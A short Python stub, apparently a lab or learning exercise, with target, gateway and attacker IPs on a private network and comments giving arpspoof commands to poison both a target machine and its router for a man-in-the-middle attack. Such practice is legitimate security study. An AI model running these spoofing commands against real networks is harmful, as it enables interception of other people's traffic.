#/usr/bin/env python
# Rebuild

target_interface_1 = "192.168.63.174"
target_interface_2 = "192.168.63.177"
my_gateway = "192.168.63.2"
my_ip = "192.168.63.139"
# Prior to Spoofing the target machine can ping me and connect to my webserver.
# Using arpspoof at the command line, run both in different windows
# Fool the Target
# sudo arpspoof -i eth0 [TARGET IP] -t [GATEWAY IP]
# Fool the Router
# sudo arpspoof -i eth0 [GATEWAY IP] -t [TARGET IP]
# So Spoofing running, Target machine can ping out, and load my webserver
# Which had stopped workikng in the completed program.
